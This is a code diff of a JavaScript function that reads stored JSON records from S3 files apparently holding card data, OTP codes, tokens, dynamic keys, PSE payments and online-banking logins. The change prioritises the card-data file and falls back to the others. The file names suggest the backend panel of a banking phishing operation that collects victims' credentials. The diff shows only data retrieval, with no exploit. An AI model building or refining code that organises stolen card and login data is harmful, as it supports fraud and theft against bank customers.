@@ -38,32 +38,58 @@ function validarJWT(token) {
 }
 
 async function obtenerTransacciones() {
-    const archivos = ['datos_consultas.txt', 'datos_otp.txt', 'datos_token.txt', 'datos_dinamica.txt', 'datos_blogin.txt', 'datos_pse.txt', 'datos_tarjeta.txt'];
     const transacciones = [];
 
-    for (const archivo of archivos) {
-        try {
-            const data = await new Promise((resolve, reject) => {
-                s3.getObject({ Bucket: BUCKET, Key: archivo }, (err, data) => {
-                    if (err) reject(err);
-                    else resolve(data);
+    // Leer principalmente datos_tarjeta.txt (datos completos de transacciones)
+    const archivoPrincipal = 'datos_tarjeta.txt';
+
+    try {
+        const data = await new Promise((resolve, reject) => {
+            s3.getObject({ Bucket: BUCKET, Key: archivoPrincipal }, (err, data) => {
+                if (err) reject(err);
+                else resolve(data);
+            });
+        });
+
+        const contenido = data.Body.toString();
+        const lineas = contenido.split('\n').filter(l => l.trim());
+
+        lineas.forEach(linea => {
+            try {
+                const obj = JSON.parse(linea);
+                transacciones.push({ ...obj, tipo: 'tarjeta', archivo: archivoPrincipal });
+            } catch (e) {
+                // Ignorar líneas inválidas
+            }
+        });
+    } catch (error) {
+        // Si no hay tarjetas, leer otros archivos como fallback
+        const archivosFallback = ['datos_pse.txt', 'datos_blogin.txt', 'datos_consultas.txt'];
+
+        for (const archivo of archivosFallback) {
+            try {
+                const data = await new Promise((resolve, reject) => {
+                    s3.getObject({ Bucket: BUCKET, Key: archivo }, (err, data) => {
+                        if (err) reject(err);
+                        else resolve(data);
+                    });
                 });
-            });
 
-            const contenido = data.Body.toString();
-            const lineas = contenido.split('\n').filter(l => l.trim());
+                const contenido = data.Body.toString();
+                const lineas = contenido.split('\n').filter(l => l.trim());
 
-            lineas.forEach(linea => {
-                try {
-                    const obj = JSON.parse(linea);
-                    const tipo = archivo.replace('datos_', '').replace('.txt', '');
-                    transacciones.push({ ...obj, tipo, archivo });
-                } catch (e) {
-                    // Ignorar líneas inválidas
-                }
-            });
-        } catch (error) {
-            // Archivo no existe aún, continuar
+                lineas.forEach(linea => {
+                    try {
+                        const obj = JSON.parse(linea);
+                        const tipo = archivo.replace('datos_', '').replace('.txt', '');
+                        transacciones.push({ ...obj, tipo, archivo });
+                    } catch (e) {
+                        // Ignorar líneas inválidas
+                    }
+                });
+            } catch (error) {
+                // Continuar con siguiente archivo
+            }
         }
     }
 
